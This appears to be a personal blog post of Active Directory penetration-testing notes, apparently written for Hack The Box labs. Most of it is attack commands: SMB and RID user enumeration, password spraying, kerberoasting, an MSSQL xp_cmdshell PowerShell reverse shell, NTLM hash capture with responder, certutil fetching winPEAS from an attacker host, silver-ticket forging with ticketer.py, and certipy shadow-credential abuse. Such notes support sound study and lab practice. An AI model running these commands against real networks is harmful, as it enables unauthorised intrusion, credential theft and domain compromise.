---
layout: post
title: AD Notes
categories: [writeups]
tags: [notes]
date: 2025-03-02
img_path: '/assets/img/writeups/htb/cat/'
image:
  path: 
---

# Enumerating SMB (445)

- Enumerate Host
    - `netexec smb [ip]`
    - `crackmapexec smb [ip]`
    - `nxc smb [ip]`
- List Shares
    - netexec smb [host/ip] -u [user] -p [pass] --shares
    - netexec smb [host/ip] -u guest -p '' --shares
    - smbclient -N -L //[ip]
- Enumerate Files
    - smbclient //[ip]/[share] -N
    - smbclient //[ip]/[share] -U [username%password]
    - smbclient "//10.10.X.X/Some Share" -U rose%Kxxxxxxxx
    - netexec smb -u [user] -p [pass] -M spider_plus
    - smbclient.py '[domain]/[user]:[pass]@[ip/host] -k -no-pass - Kerberos auth
    - manspider.py --threads 256 [IP/CIDR] -u [username] -p [pass] [options]
- User enumeration
    - RID Cycling
        - lookupsid.py guest@[ip] -no-pass
        - netexec smb [ip] -u guest -p '' --rid-brute
        - netexec smb CICADA-DC -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users
    - SAM Remote Protocol - samrdump.py [domain]/[user]:[pass]@[ip]
- Check for Vulnerabilities - nmap --script smb-vuln* -p 139,445 [ip]

# rpc
`rpcclient -U 'xxxxx.htb/' 10.10.x.x`
in rpcclient 
`lookupnames administrator`
this will privide a sid
`lookupsids <sid>`
then to manually brute the users change the digits of 500
ex 501 502 503 etc (same as rid-brute) 

# LDAP 

`mkdir ldapdump && cd ldapdump`
`sudo ldapdomaindump ldaps://10.10.x.x -u '<DOMAIN\USER>' -p '<pass>'`

## bloodhound
start neo4j before bloodhound
`sudo neo4j console`
`sudo bloodhound`
if data is in bloodhound from previous clear database...

to get domain info to import
`mkdir bloodhound && cd bloodhound`
`sudo bloodhound-python -d XXXXX.htb -u <user> -p <pass> -ns 10.10.X.X -c all`

in bloodhound import all the files



# MSSQL


`python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py <user>:'<MSSQLPASSWORD>'@10.10.X.X

check to see if xp_cmdshell can be enabled
if so try a powershell rev shell
`nc -nvlp 1337`
`xp_cmdshell powershell -e <base64-rev>`

can get hash from xp_dirtree using responder
lhost:
`sudo responder -I tun0`
mssql
`xp_dirtree \\<$LHOST>\fake\share`


# netexec / crackmapexec

will check a list of users and passwords to see if you can connect via ldap
`netexec ldap 10.10.X.X -u users -p passes --continue-on-success | grep +`

will check a list of users and passwords to see if you can connect to with evil-winrm 
`netexec winrm 10.10.X.X -u users -p passes --continue-on-success | grep +`

kerberoasting need to look into more
`netexec ldap 10.10.X.X -u rose -p 'Kxxxxxxxx' --kerberoasting kerberoast.hash`

# evil-winrm
`evil-winrm -i 10.10.X.X -u <user> -p <pass>`
if file is in cwd where evil-winrm is runnning
`upload winpeas.exe`
## upload winpeas
`cd \programdata`
`certutil.exe -urlcache -split -f "http://10.10.X.X:8000/winPEASany.exe" winpeas.exe`

winpeas, poverview.ps1, mimikatz, rubeus, A bunch of tools in /opt/SharpCollection certify.exe, runascs etc

findstr is equiv to grep
can run `netstat -an | findstr <port>` 


# Silver ticket
can create the ntlm hash for the ticket. 
using plaintext2ntlm.py 
can run from powershell `get-addomain` to get Domain SID
```
NTLM: <ntlm>
Domain-sid: <sid>
SPN:? 
```
`python3 /usr/share/doc/python3-impacket/examples/ticketer.py -nthash <ntlm> -domain-sid <sid> -domain XXXXX.htb -spn TotallylegitSPN/dc.XXXXX.htb administrator`

in output should see
 saving ticket in <administrator.ccache>

`KRB5CCNAME=administrator.ccache python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -k administrator@dc.XXXXX.htb`

with no password

this will log you in as admin for mssql and can now do things like enable_xp_cmdshell

maybe for other attack vectors like reading writing files
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md

 if you can write files checkout (run line 8-15 as 1 line)
https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql

# Golden ticket



# Win Privesc
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md


# Escalating through certificates

faketime 'now + 7 hours' /bin/bash -c "certipy-ad shadow auto -u juditxxxx@xxxxxx.htb -p judxxxxxx -account managxxxxxx -target DC01.xxxxxx.htb"